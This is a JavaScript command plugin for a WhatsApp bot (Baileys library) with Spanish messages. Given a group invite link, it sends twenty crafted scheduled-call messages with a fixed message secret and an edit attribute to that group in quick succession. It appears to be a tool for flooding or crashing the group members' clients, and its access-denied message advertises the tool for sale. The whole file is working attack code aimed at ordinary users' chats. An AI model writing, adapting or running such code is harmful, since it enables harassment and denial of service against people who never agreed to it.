import { getGroupInviteInfo } from '@whiskeysockets/baileys'; // si tu entorno lo necesita expl√≠cito

let handler = async (m, { conn, args, isBot, isOwner, command }) => {
  if (!isBot && !isOwner) {
    return conn.sendMessage(m.chat, {
      text: `\n ‚ùå *COMANDO NEGADO, SOLO PUEDE SER USADO POR MI PORTADOR. SI DESEAS ADQUIRIRLO MANDA MENSAJE A: +526421147692*\n`
    }, { quoted: m });
  }

  const link = args[0];
  if (!link || !link.includes('chat.whatsapp.com/')) {
    return m.reply('üìé *Debes proporcionar un enlace de grupo v√°lido.*\n\nEjemplo: *.antiblock2 https://chat.whatsapp.com/xxxxxxxxxxxx*');
  }

  const code = link.split('/').pop().trim();
  let groupInfo;
  try {
    groupInfo = await conn.groupGetInviteInfo(code);
  } catch (e) {
    return m.reply('‚ùå *El enlace no es v√°lido o ya expir√≥.*');
  }

  const groupJid = groupInfo.id;
  const cantidad = 20;

  for (let i = 0; i < cantidad; i++) {
    try {
      await conn.relayMessage(groupJid, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: link,
        }
      }, {
        additionalAttributes: { edit: '7' }
      });

      await delay(100);
    } catch (e) {
      console.error(`[ERROR] Fall√≥ al enviar al grupo:`, e);
    }
  }

  await m.reply('‚úÖ *Comando ejecutado con √©xito en el grupo.*');
};

handler.command = ['antiblock2'];
handler.owner = false;
handler.bot = true;

export default handler;

// Funci√≥n de espera
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}